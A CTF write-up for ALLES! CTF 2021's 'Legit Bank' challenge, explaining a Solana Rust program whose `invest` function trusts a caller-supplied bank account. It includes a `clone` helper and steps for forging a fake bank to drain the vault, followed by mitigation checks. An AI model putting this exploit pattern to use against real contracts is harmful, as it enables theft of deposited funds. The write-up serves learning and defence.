# ALLES! CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20210904-allesctf/) of this writeup.**


 - [ALLES! CTF 2021](#alles-ctf-2021)
   - [Zoomer Crypto](#zoomer-crypto)
     - [Legit Bank](#legit-bank)
       - [Issue](#issue)
       - [Exploit](#exploit)
       - [Mitigation](#mitigation)


## Zoomer Crypto

### Legit Bank

> Jonah1005 ([@jonah1005w](https://twitter.com/jonah1005w))

This challenge is solved after the CTF ends.

Legit Bank seems to be a simple defi system with five entrypoints. Users can deposit into the bank and receive the interest. Since there's no on-chain borrowing in the bank, it seems to be some undercollaterized defi protocol like [maple finance](https://www.maple.finance/), [TrueFi](https://truefi.io/), etc. 

#### Issue
Bank manager would call `invest` to send the funds to a receiver. The vulnerability lies in the function `invest`

```rust

/// See struct BankInstruction for docs
fn invest(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    let [bank_info, vault_info, vault_authority_info, dest_token_account_info, manager_info, _spl_token_program] =
        array_ref![accounts, 0, 6];
    // verify that manager has approved
    if !manager_info.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    // verify that manager is correct
    let bank: Bank = Bank::try_from_slice(&bank_info.data.borrow())?;
    if bank.manager_key != manager_info.key.to_bytes() {
        return Err(0xbeefbeef.into());
    }

    // verify that the vault is correct
    if vault_info.key.as_ref() != &bank.vault_key {
        return Err(ProgramError::InvalidArgument);
    }

    // verify that enough money is left in reserve
    let vault = spl_token::state::Account::unpack(&vault_info.data.borrow())?;
    if (vault.amount - amount) * 100 < bank.total_deposit * u64::from(bank.reserve_rate) {
        return Err(0xfeedf00d.into());
    }

    // transfer tokens to manager
    invoke_signed(
        &spl_token::instruction::transfer(
            &spl_token::ID,
            &vault_info.key,
            &dest_token_account_info.key,
            &vault_authority_info.key,
            &[],
            amount,
        )?,
        &[
            vault_info.clone(),
            dest_token_account_info.clone(),
            vault_authority_info.clone(),
        ],
        &[&[vault_info.key.as_ref(), &[bank.vault_authority_seed]]],
    )?;

    Ok(())
}
```


The program would check whether the `bank_manager` is signed. 

Here's how the problem is. The program reads the address of `bank_manager` from the `bank`. Since the bank is provieded by the user, an attacker can provide a fake bank and replace the `bank_manger` with his own address. 



I simply create a new function in the program to clone a bank and replace the bank_manager.

```rust=
/// See struct BankInstruction for docs
fn clone(_program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let [target_bank_info, cloned_bank_info, manager_info] =
        array_ref![accounts, 0, 3];

    // verify that manager is correct
    let bank: Bank = Bank::try_from_slice(&target_bank_info.data.borrow())?;
    let mut cloned_bank: Bank = Bank::try_from_slice(&cloned_bank_info.data.borrow())?;
    cloned_bank.manager_key = manager_info.key.to_bytes();
    cloned_bank.vault_key = bank.vault_key;
    cloned_bank.vault_authority_seed = bank.vault_authority_seed;
    cloned_bank.reserve_rate = bank.reserve_rate;
    cloned_bank.serialize(&mut &mut cloned_bank_info.data.borrow_mut()[..])?;

    Ok(())
}
```


#### Exploit

1. Create a data account and clone a fake bank
2. Replace `manager_key` in the fake bank. Since the fake bank is created by the attacker, we can replace whatever field we want.
3. Call `invest` with the fake_bank and invest to ourself.  Note: the rest of the parameters should be the same as the token belongs to the vault and authority.

#### Mitigation

Since Solana handles data differently from Ethereum, users would have to specify the data their using and provided info in the transactions. As this breaks dependency between transactions and boosts the network efficiency, developers from the Ethereum community may have some false assumptions of program's storage. [Solend's been hacked](https://twitter.com/solendprotocol/status/1428611597941891082) for the similar issue. [Report](https://docs.google.com/document/d/1-WoQwT1QrPEX-r4N-fDamRQ50LM8DsdsOyq1iTabS3Q/edit) 

The legit bank checks the correctness of bank address in `deposit` and `withdraw`, however, the check is missed in the invest function.

```rust
    // check that the bank account is correct
    let (bank_address, _) = Pubkey::find_program_address(&[], program_id);
    if *bank_info.key != bank_address {
        return Err(ProgramError::InvalidArgument);
    }
```

Or a more simple way is to check whether the `bank.owner == program_id` as only account's owner can modify its data. 

The flag is:

```
ALLES!{Some Smart Contracts are not very smart :(}
```
